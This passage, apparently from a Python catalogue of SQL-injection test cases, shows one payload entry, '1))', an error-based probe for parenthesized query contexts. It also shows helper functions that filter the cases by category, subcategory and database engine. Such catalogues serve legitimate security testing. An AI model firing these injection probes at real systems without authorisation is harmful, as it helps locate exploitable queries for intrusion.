        payload="1))",
        description="Unbalanced closing-parenthesis pair, a syntax-error trigger for the parenthesized-context family distinct from error_02's quote-plus-paren combination.",
        subcategory="error_based",
        db_compat=["generic"],
    ),
]


def get_by_category(category: VulnCategory) -> list[TestCase]:
    return [t for t in TEST_CASES if t.category == category]


def get_by_subcategory(subcategory: str) -> list[TestCase]:
    """New helper, additive only — does not touch get_by_category().
    Returns [] for any TestCase where subcategory was never set (i.e. all
    original pre-expansion cases), rather than raising, so it's safe to
    call across the full mixed old/new catalogue.
    """
    return [t for t in TEST_CASES if t.subcategory == subcategory]


def get_by_db(engine: str) -> list[TestCase]:
    """New helper, additive only. Returns [] for cases with no db_compat set."""
    return [t for t in TEST_CASES if t.db_compat and engine in t.db_compat]